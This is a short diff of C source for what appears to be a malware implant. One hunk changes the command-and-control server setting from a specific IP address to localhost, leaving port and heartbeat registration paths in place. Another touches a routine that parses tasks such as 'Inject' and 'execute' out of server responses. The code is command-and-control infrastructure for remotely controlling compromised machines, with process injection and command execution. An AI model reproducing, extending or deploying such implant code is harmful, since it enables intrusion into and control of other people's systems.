@@ -54,7 +54,7 @@ int DEBUG_MODE = 1; // 1 to enable debug, 0 to disable
 #define THRESHOLD_MIN_RAM_MB 2048
 
 // C2 SERVER CONFIGURATION
-#define C2_SERVER "162.19.242.23"
+#define C2_SERVER "localhost"
 #define C2_PORT 3000
 #define C2_REGISTER_PATH "/heartbeat/register"
 #define C2_HEARTBEAT_PATH "/heartbeat"
@@ -1452,7 +1452,7 @@ int parse_task_from_response(const char* json, Task* task) {
 
         if (*val == '"') {
             // Flat string format: "task":"Inject"
-            val++; // skip opening quote
+            val++;
             if (_strnicmp(val, "inject", 6) == 0) {
                 task->type = TASK_INJECT;
             } else if (_strnicmp(val, "execute", 7) == 0) {
